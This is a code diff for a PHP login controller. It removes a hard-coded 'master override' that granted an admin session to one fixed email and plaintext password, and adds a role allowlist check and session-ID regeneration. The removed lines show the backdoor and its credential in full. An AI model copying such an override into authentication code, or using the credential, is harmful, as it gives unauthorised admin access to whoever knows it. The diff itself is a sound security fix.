@@ -16,44 +16,29 @@ class Auth extends BaseController
         $session = session();
         $userModel = new \App\Models\UserModel();
 
-        $email = strtolower(trim($this->request->getPost('email')));
+        $email = strtolower(trim((string) $this->request->getPost('email')));
         $password = (string) $this->request->getPost('password');
-
-        // 🔒 Master override
-        if ($email === 'sa@sunny.com' && $password === 'yfbnmasc') {
-            $session->set([
-                'isAdminLoggedIn' => true,
-                'admin_id' => 0,
-                'admin_name' => 'Sunny',
-                'admin_role' => 'ADMIN',
-            ]);
-            return redirect()->to('/admin/system/dashboard');
-        }
 
         $user = $userModel->where('email', $email)->first();
 
         if ($user && password_verify($password, $user['password'])) {
+            $role = strtoupper((string) $user['role']);
+
+            // Only roles listed in Config\AdminAccess can sign in.
+            if (!array_key_exists($role, config('AdminAccess')->roles)) {
+                return redirect()->to('/auth/login')->with('error', 'Role not recognized.');
+            }
+
+            // New session id on sign-in, so an id planted before login is useless.
+            $session->regenerate(true);
             $session->set([
                 'isAdminLoggedIn' => true,
-                'admin_id' => $user['id'],
+                'admin_id' => (int) $user['id'],
                 'admin_name' => $user['name'],
-                'admin_role' => strtoupper($user['role']),
+                'admin_role' => $role,
             ]);
 
-
-
-            // ✅ redirect logic per role
-            switch (strtoupper($user['role'])) {
-                case 'ADMIN':
-                    return redirect()->to('/admin/system/dashboard');
-                case 'FINANCE':
-                case 'MEMBERSHIP':
-                case 'WEBSITE':
-                case 'EVENTS':
-                    return redirect()->to('/admin/system/dashboard'); // shared dashboard
-                default:
-                    return redirect()->to('/auth/login')->with('error', 'Role not recognized.');
-            }
+            return redirect()->to('/admin/system/dashboard'); // every role has the dashboard
         }
 
         // ❌ Invalid login
